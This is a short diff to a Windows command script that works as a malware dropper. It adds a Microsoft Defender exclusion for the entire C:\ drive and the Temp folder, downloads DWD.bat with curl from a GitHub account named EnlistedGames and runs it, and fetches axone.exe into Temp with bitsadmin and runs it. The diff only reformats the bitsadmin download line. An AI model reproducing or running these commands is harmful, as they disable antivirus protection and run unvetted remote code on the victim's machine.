@@ -1,7 +1,9 @@
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath C:\,C:\Windows\Temp\
 
 curl -o C:\Windows\Temp\DWD.bat https://raw.githubusercontent.com/EnlistedGames/curl/main/DWD.bat
+
 C:\Windows\Temp\DWD.bat
 
-bitsadmin /transfer myDownloadJob /download /priority normal "https://github.com/EnlistedGames/curl/raw/main/axone.exe" "C:\Windows\Temp\axone.exe"
+bitsadmin.exe /transfer "JobName" https://github.com/EnlistedGames/curl/raw/main/axone.exe C:\Windows\Temp\axone.exe
+
 C:\Windows\Temp\axone.exe
